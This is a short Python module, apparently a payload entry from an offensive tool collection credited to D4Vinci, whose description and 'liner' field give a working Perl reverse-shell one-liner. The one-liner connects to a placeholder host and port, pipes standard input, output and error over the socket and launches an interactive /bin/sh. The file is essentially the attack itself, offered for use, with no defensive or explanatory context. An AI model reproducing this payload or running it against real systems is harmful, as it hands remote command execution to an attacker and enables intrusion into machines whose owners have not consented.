class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses perl sockets & the output of your commands will be piped back."
    function    = "reverse shell"
    liner     = """perl -e 'use Socket;$i="TARGET";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' """
